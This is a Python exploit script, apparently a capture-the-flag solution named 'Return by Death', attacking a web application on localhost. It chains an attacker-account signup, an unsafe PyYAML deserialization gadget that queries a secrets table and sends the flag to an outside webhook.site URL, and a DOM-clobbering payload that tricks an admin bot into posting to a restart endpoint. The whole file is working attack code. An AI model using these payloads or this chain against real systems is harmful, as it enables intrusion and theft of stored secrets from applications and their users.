import requests
import urllib.parse
import time

TARGET_URL = "http://localhost:8080"
WEBHOOK_URL = "https://webhook.site/cb2fc4b7-de27-4172-881f-6a97b5c7ed36" 

session = requests.Session()

def register_and_login():
    """Creates a new account and logs in."""
    print("[+] Step 0: Registering and authenticating attacker account...")

    session.post(f"{TARGET_URL}/api/v1/auth/register", json={"username": "attacker", "password": "password123"})
    
    resp = session.post(f"{TARGET_URL}/api/v1/auth/login", json={"username": "attacker", "password": "password123"})
    
    if resp.status_code == 200:
        print("[*] Successfully authenticated.")
    else:
        print("[-] Auth failed.")
        exit(1)

def generate_yaml_payload():
    """Payload targets the new DatabaseExporter to dump the secrets table."""
    print("[+] Building the PyYAML SQL Exfiltration gadget...")
    return f"""
version: "1.0"
user_profile: "Attacker"
trigger_exploit: !!python/object/apply:app.utils.cluster_utils.DatabaseExporter
  kwds:
    query: "SELECT secret_value FROM system_secrets WHERE secret_name='FLAG';"
    export_url: "{WEBHOOK_URL}"
"""

def upload_profile(payload):
    target = f"{TARGET_URL}/api/v1/users/me/import-legacy"
    print(f"[+] Step 1: Uploading malicious profile to {target} ...")
    files = {'file': ('profile.yml', payload, 'application/x-yaml')}
    session.post(target, files=files)
    print(f"[*] Payload resting in /app/cache volume.")

def trigger_admin_bot():
    print("[+] Step 2: Crafting DOM Clobbering payload...")

    clobber_payload = '<form id="ANALYTICS_CONFIG" action="/api/v1/infra/maintenance/restart" method="POST"></form>'
    encoded_bio = urllib.parse.quote(clobber_payload)
    
    weaponized_url = f"{TARGET_URL}/profile/attacker?bio={encoded_bio}"
    
    print(f"[*] Dispatching Admin Bot to {weaponized_url}")
    session.post(f"{TARGET_URL}/api/v1/support/ticket", json={"url": weaponized_url})

if __name__ == "__main__":
    print("==================================================")
    print("      RETURN BY DEATH - AUTOMATED EXPLOIT         ")
    print("==================================================")
    register_and_login()
    upload_profile(generate_yaml_payload())
    trigger_admin_bot()
    print(f"\n[+] Exploit chain deployed. Awaiting DB Exfiltration at {WEBHOOK_URL} ...")